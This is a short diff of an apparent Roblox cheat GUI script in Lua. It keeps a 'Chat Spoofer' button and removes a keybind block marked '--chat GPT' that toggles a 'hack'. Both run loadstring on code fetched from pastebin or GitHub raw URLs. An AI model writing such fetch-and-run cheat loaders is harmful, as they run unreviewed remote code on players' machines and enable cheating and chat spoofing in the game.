@@ -50,22 +50,3 @@ local OtherSection = Other:NewSection("Other")
 OtherSection:NewButton("Chat Spoofer", "Say coco", function()
     loadstring(game:HttpGet('https://pastebin.com/raw/MdSA4fn5'))()
 end)
-
---chat GPT
--- Define the keybind
-Section:NewKeybind("Toggle Hack", "Toggles the hack on/off", Enum.KeyCode.F, function()
-    -- Check if the hack is already enabled
-    if _G.HackEnabled then
-        -- Disable the hack
-        _G.HackEnabled = false
-        print("Hack disabled")
-    else
-        -- Enable the hack
-        _G.HackEnabled = true
-        print("Hack enabled")
-        
-        -- Add your code to enable the hack here
-        -- For example:
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/affuck/Akuma/main/Created"))()
-    end
-end)
